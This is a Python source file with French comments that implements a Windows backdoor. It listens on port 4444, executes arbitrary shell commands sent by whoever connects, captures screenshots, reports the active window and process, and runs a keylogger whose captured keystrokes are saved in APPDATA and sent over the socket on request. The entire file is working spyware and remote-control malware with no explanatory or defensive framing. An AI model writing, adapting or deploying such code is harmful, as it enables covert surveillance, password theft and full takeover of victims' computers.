import socket
import subprocess as sp
import asyncio
import pyautogui
import os
import time
import struct
import threading
import win32gui
import win32process
import psutil
from pynput import keyboard
import json

# Réseau
host = "0.0.0.0"
port = 4444

# Fichier de log dans APPDATA
keylog_file = os.path.join(os.environ["APPDATA"], "keylog.json")
keylog_listener = None

# Créer le fichier de logs s'il n'existe pas
if not os.path.exists(keylog_file):
    with open(keylog_file, "w", encoding="utf-8") as f:
        json.dump([], f)

# Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print(f"[*] En attente de connexion sur {host}:{port}")

# Exécution de commande shell
async def execute_command(command):
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    return out + err

# Capture d'écran
def take_screenshot():
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    filename = f"{ip}_{hostname}_{timestamp}.png"
    screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return screenshot_path, filename

# Info de fenêtre active
def get_active_window_info():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return f"Titre: {title}\nProcessus: {process.name()}\nPID: {pid}\nExécutable: {process.exe()}"
    except Exception as e:
        return f"Erreur lors de la récupération des informations: {str(e)}"

# Thread du keylogger
def keylogger_thread():
    def on_press(key):
        try:
            key_str = str(key)
            if os.path.exists(keylog_file):
                with open(keylog_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
            else:
                data = []

            data.append(key_str)

            with open(keylog_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"[!] Erreur dans le keylogger: {e}")

    global keylog_listener
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    keylog_listener.join()

# Gestion du client
async def handle_client(conn):
    global keylog_listener

    while True:
        try:
            command = conn.recv(1024).decode()
            if not command:
                break

            if command == "SCREENSHOT":
                screenshot_path, filename = take_screenshot()
                with open(screenshot_path, "rb") as file:
                    data = file.read()
                conn.sendall(struct.pack("!I", len(data)))
                conn.sendall(filename.encode().ljust(100))
                conn.sendall(data)

            elif command == "GET_ACTIVE_WINDOW":
                info = get_active_window_info()
                conn.send(info.encode())

            elif command == "START_KEYLOG":
                if keylog_listener is None:
                    thread = threading.Thread(target=keylogger_thread, daemon=True)
                    thread.start()
                    conn.send(b"Keylogger started")
                else:
                    conn.send(b"Keylogger already running")

            elif command == "STOP_KEYLOG":
                if keylog_listener:
                    keylog_listener.stop()
                    keylog_listener = None
                    conn.send(b"Keylogger stopped")
                else:
                    conn.send(b"No active keylogger")

            elif command == "GET_KEYLOGS":
                try:
                    if os.path.exists(keylog_file):
                        with open(keylog_file, "r", encoding="utf-8") as f:
                            data = f.read()
                        conn.sendall(data.encode())
                    else:
                        conn.sendall(b"[!] Aucun fichier de log trouve.")
                except Exception as e:
                    conn.sendall(f"[!] Erreur lors de l'envoi des logs: {str(e)}".encode())

            else:
                result = await execute_command(command)
                conn.send(result.encode() if result else b"Commande executee sans resultat.\n")

        except Exception as e:
            print(f"[!] Connexion interrompue : {e}")
            break

    conn.close()
    print("[-] Connexion fermée.")

# Boucle principale
async def main():
    while True:
        conn, addr = s.accept()
        print(f"[+] Connexion établie avec {addr[0]}")
        await handle_client(conn)

# Lancement
asyncio.run(main())
